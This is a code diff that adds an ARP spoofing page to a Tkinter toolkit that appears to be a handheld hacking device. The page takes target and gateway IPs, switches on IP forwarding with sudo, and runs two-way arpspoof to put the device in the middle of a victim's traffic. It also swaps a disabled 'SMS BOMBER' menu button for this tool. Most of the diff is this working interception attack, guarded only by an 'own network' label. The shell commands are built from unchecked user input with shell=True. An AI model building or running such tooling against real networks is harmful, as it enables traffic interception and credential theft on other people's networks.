@@ -99,7 +99,7 @@ class GhostDeckApp(tk.Tk):
                 SSLCertPage, IPInfoPage, ReverseIPPage, TechStackPage, WaybackPage,
                 RobotsPage, SitemapPage, SecHeadersPage, PortCheckPage,
                 ClockPage, CalculatorPage, FileManagerPage, SpeedtestPage, SnakePage,
-                ChronometerPage):
+                ChronometerPage, ArpSpoofPage):
             fr = F(parent=self.container, controller=self); self.frames[F.__name__] = fr
             fr.place(x=0, y=0, width=480, height=320)
         self.show_frame("BootPage", add_to_history=False)
@@ -1896,10 +1896,261 @@ class ChronometerPage(tk.Frame):
         self.laps_area.see(tk.END)
         self.laps_area.config(state=tk.DISABLED)
 
+class ArpSpoofPage(tk.Frame):
+    """ARP Spoofing (Man-in-the-Middle) — sadece kendi ağınızda!"""
+    def __init__(self, parent, controller):
+        tk.Frame.__init__(self, parent, bg="black", width=480, height=320)
+        self.controller = controller
+        self.processes = []
+        self.running = False
+
+        # --- Toolbar ---
+        tb = tk.Frame(self, bg="#111111"); tb.place(x=0, y=0, width=480, height=30)
+        tk.Button(tb, text="< BACK", bg="#111111", fg="#39ff14",
+                  font=("Helvetica",11,"bold"), bd=0,
+                  command=self.smart_back).pack(side="left", fill="y")
+        tk.Label(tb, text="ARP SPOOFING", bg="#111111", fg="#aa0000",
+                 font=("Helvetica",11,"bold")).pack(side="left", expand=True)
+
+        # --- Input Frame ---
+        self.input_frame = tk.Frame(self, bg="black")
+
+        tk.Label(self.input_frame, text="⚠ ONLY USE ON YOUR OWN NETWORK", bg="black",
+                 fg="#aa0000", font=("Helvetica",9,"bold")).place(relx=0.5, y=5, anchor="n")
+
+        tk.Label(self.input_frame, text="TARGET IP:", bg="black", fg="#39ff14",
+                 font=("Helvetica",10,"bold")).place(x=10, y=30)
+        self.target_entry = tk.Entry(self.input_frame, font=("Helvetica",14),
+                                      bg="#222", fg="white", bd=2, relief="solid",
+                                      insertbackground="#39ff14")
+        self.target_entry.place(x=10, y=50, width=460, height=30)
+
+        tk.Label(self.input_frame, text="GATEWAY IP:", bg="black", fg="#39ff14",
+                 font=("Helvetica",10,"bold")).place(x=10, y=85)
+        self.gateway_entry = tk.Entry(self.input_frame, font=("Helvetica",14),
+                                       bg="#222", fg="white", bd=2, relief="solid",
+                                       insertbackground="#39ff14")
+        self.gateway_entry.place(x=10, y=105, width=460, height=30)
+
+        # Otomatik gateway algılama
+        tk.Button(self.input_frame, text="AUTO-DETECT GATEWAY", bg="#333", fg="#39ff14",
+                  font=("Helvetica",10,"bold"), command=self.detect_gateway
+                  ).place(x=10, y=140, width=225, height=28)
+        tk.Button(self.input_frame, text="CLEAR", bg="#333", fg="white",
+                  font=("Helvetica",10,"bold"),
+                  command=lambda: (self.target_entry.delete(0, tk.END),
+                                   self.gateway_entry.delete(0, tk.END))
+                  ).place(x=245, y=140, width=225, height=28)
+
+        # Basit numeric keypad
+        self.kb_target = tk.StringVar(value="target")
+        self._build_keypad(self.input_frame, y_start=175)
+
+        # START butonu
+        tk.Button(self.input_frame, text="START SPOOFING", font=("Helvetica",13,"bold"),
+                  bg="#aa0000", fg="white", command=self.start_spoof
+                  ).place(x=0, y=285, width=480, height=25)
+
+        # --- Log Frame ---
+        self.log_frame = tk.Frame(self, bg="black")
+        sb = tk.Scrollbar(self.log_frame); sb.pack(side="right", fill="y")
+        self.log_area = tk.Text(self.log_frame, bg="black", fg="#39ff14",
+                                font=("Helvetica",10), bd=0, padx=5, pady=5,
+                                yscrollcommand=sb.set, state=tk.DISABLED)
+        self.log_area.pack(side="left", fill="both", expand=True)
+        sb.config(command=self.log_area.yview)
+        make_readonly_text(self.log_area)
+
+        # STOP butonu (log ekranındayken)
+        self.btn_stop = tk.Button(self, text="STOP SPOOFING", font=("Helvetica",13,"bold"),
+                                   bg="#aa0000", fg="white", command=self.stop_spoof)
+
+    def _build_keypad(self, parent, y_start):
+        """Sadece IP girişi için basit keypad."""
+        active = self._active_entry()  # target veya gateway
+
+        # Target/Gateway seçici
+        sel = tk.Frame(parent, bg="black")
+        sel.place(x=10, y=y_start-25, width=460, height=22)
+        self.btn_sel_target = tk.Button(sel, text="→ TARGET", font=("Helvetica",8,"bold"),
+                                         bg="#005500", fg="white", bd=0,
+                                         command=lambda: self._set_focus("target"))
+        self.btn_sel_target.pack(side="left", fill="both", expand=True, padx=1)
+        self.btn_sel_gateway = tk.Button(sel, text="→ GATEWAY", font=("Helvetica",8,"bold"),
+                                          bg="#333", fg="#39ff14", bd=0,
+                                          command=lambda: self._set_focus("gateway"))
+        self.btn_sel_gateway.pack(side="left", fill="both", expand=True, padx=1)
+
+        # Rakamlar
+        rows = [["1","2","3"],["4","5","6"],["7","8","9"],[".","0","⌫"]]
+        for r, row in enumerate(rows):
+            for c, ch in enumerate(row):
+                if ch == "⌫":
+                    cmd = self._del_char
+                    bg = "#aa0000"
+                else:
+                    cmd = lambda x=ch: self._add_char(x)
+                    bg = "#222"
+                tk.Button(parent, text=ch, command=cmd, bg=bg, fg="#39ff14",
+                          font=("Helvetica",11,"bold"), bd=1, relief="solid",
+                          highlightbackground="#39ff14"
+                          ).place(x=10 + c*153, y=y_start + r*25, width=153, height=24)
+
+    def _active_entry(self):
+        return self._focus if hasattr(self, '_focus') else None
+
+    def _set_focus(self, which):
+        self._focus = which
+        if which == "target":
+            self.btn_sel_target.config(bg="#005500", fg="white")
+            self.btn_sel_gateway.config(bg="#333", fg="#39ff14")
+        else:
+            self.btn_sel_target.config(bg="#333", fg="#39ff14")
+            self.btn_sel_gateway.config(bg="#005500", fg="white")
+
+    def _add_char(self, ch):
+        if not hasattr(self, '_focus'): self._focus = "target"
+        entry = self.target_entry if self._focus == "target" else self.gateway_entry
+        entry.insert(tk.END, ch)
+
+    def _del_char(self):
+        if not hasattr(self, '_focus'): self._focus = "target"
+        entry = self.target_entry if self._focus == "target" else self.gateway_entry
+        cur = entry.get()
+        if cur: entry.delete(len(cur)-1, tk.END)
+
+    def on_show(self):
+        self.show_input()
+
+    def show_input(self):
+        self.log_frame.place_forget()
+        self.btn_stop.place_forget()
+        self.input_frame.place(x=0, y=30, width=480, height=290)
+
+    def show_log(self):
+        self.input_frame.place_forget()
+        self.log_frame.place(x=0, y=30, width=480, height=260)
+        self.btn_stop.place(x=0, y=290, width=480, height=30)
+
+    def smart_back(self):
+        if self.running:
+            self.stop_spoof()
+            return
+        if self.log_frame.place_info():
+            self.show_input()
+        else:
+            self.controller.go_back()
+
+    def detect_gateway(self):
+        try:
+            r = subprocess.run("ip route | grep default | awk '{print $3}'",
+                              shell=True, capture_output=True, text=True, timeout=3)
+            gw = r.stdout.strip()
+            if gw:
+                self.gateway_entry.delete(0, tk.END)
+                self.gateway_entry.insert(0, gw)
+        except: pass
+
+    def start_spoof(self):
+        target = self.target_entry.get().strip()
+        gateway = self.gateway_entry.get().strip()
+        if not target or not gateway:
+            # Kısa uyarı
+            self.target_entry.config(bg="#500000")
+            self.gateway_entry.config(bg="#500000")
+            self.after(600, lambda: (self.target_entry.config(bg="#222"),
+                                     self.gateway_entry.config(bg="#222")))
+            return
+
+        # arpspoof kurulu mu?
+        if subprocess.run("which arpspoof", shell=True, capture_output=True).returncode != 0:
+            self.show_log()
+            self.log("[!] arpspoof bulunamadı")
+            self.log("[*] Kurulum: sudo apt install dsniff")
+            self.after(4000, self.show_input)
+            return
+
+        self.running = True
+        self.show_log()
+        self.log_area.config(state=tk.NORMAL)
+        self.log_area.delete(1.0, tk.END)
+        self.log_area.config(state=tk.DISABLED)
+
+        self.log(f"[*] ARP Spoofing başlatılıyor")
+        self.log(f"[*] TARGET  : {target}")
+        self.log(f"[*] GATEWAY : {gateway}")
+        self.log("")
+
+        # IP forwarding aç
+        subprocess.run("sudo sysctl -w net.ipv4.ip_forward=1",
+                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.log("[+] IP forwarding: ON")
+
+        try:
+            # İki yönlü poison
+            p1 = subprocess.Popen(
+                f"sudo arpspoof -i wlan0 -t {target} {gateway}",
+                shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1, start_new_session=True
+            )
+            p2 = subprocess.Popen(
+                f"sudo arpspoof -i wlan0 -t {gateway} {target}",
+                shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1, start_new_session=True
+            )
+            self.processes = [p1, p2]
+            self.log("[+] ARP poisoning AKTİF")
+            self.log("[*] Trafik MITM üzerinden akıyor")
+            self.log("[!] Durdurmak için STOP SPOOFING")
+            self.log("")
+
+            def reader(proc, tag):
+                try:
+                    last = ""
+                    for line in proc.stdout:
+                        if not self.running: break
+                        line = line.strip()
+                        if line and line != last:  # aynı satırı tekrar tekrar gösterme
+                            last = line
+                            self.log(f"[{tag}] {line[:70]}")
+                except: pass
+
+            threading.Thread(target=reader, args=(p1, "T→G"), daemon=True).start()
+            threading.Thread(target=reader, args=(p2, "G→T"), daemon=True).start()
+        except Exception as e:
+            self.log(f"[!] Hata: {str(e)[:50]}")
+            self.stop_spoof()
+
+    def stop_spoof(self):
+        if not self.running:
+            self.show_input()
+            return
+        self.running = False
+        self.log("[!] Durduruluyor...")
+        for p in self.processes:
+            try: os.killpg(os.getpgid(p.pid), signal.SIGINT)
+            except: pass
+        self.processes = []
+        subprocess.run("sudo sysctl -w net.ipv4.ip_forward=0",
+                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.log("[-] IP forwarding: OFF")
+        self.log("[-] ARP tablosu 30-60 sn içinde eski haline dönecek")
+        self.after(2000, self.show_input)
+
+    def log(self, m):
+        def _l():
+            self.log_area.config(state=tk.NORMAL)
+            self.log_area.insert(tk.END, m + "\n")
+            log_sinirla(self.log_area)
+            self.log_area.see(tk.END)
+            self.log_area.config(state=tk.DISABLED)
+        self.after(0, _l)
+
 class MainMenu(tk.Frame):
     APPS = [
         ("OnionShare Chat", "OnionPage"), ("File Receive", "ReceivePage"),
         ("File Send", "SendPage"), ("Nmap", "NmapPage"),
+        ("ARP Spoofing", "ArpSpoofPage"),
         ("MAC Changer", "_MAC_"),
         ("Dir Scan", "DirScanPage"), ("File Manager", "FileManagerPage"),
         ("WHOIS", "WHOISPage"), ("DNS Lookup", "DNSPage"),
@@ -2086,7 +2337,8 @@ class MainMenu(tk.Frame):
             self.cb(0,0,"ONIONSHARE\nCHAT",onion,bs); self.cb(0,1,"FILE\nRECEIVE",recv,bs)
             self.cb(1,0,"FILE\nSEND",snd,bs); self.cb(1,1,"NMAP",nmap,bs)
         elif self.current_page == 1:
-            self.cb(0,0,"SMS\nBOMBER",None,sms_style,disabled=True)
+            def arp(): self.controller.show_frame("ArpSpoofPage")
+            self.cb(0,0,"ARP\nSPOOFING",arp,bs)
             self.cb(0,1,"MAC\nCHANGER",self.show_mac,bs)
             def dirs(): self.controller.show_frame("DirScanPage")
             self.cb(1,0,"DIR\nSCAN",dirs,bs)
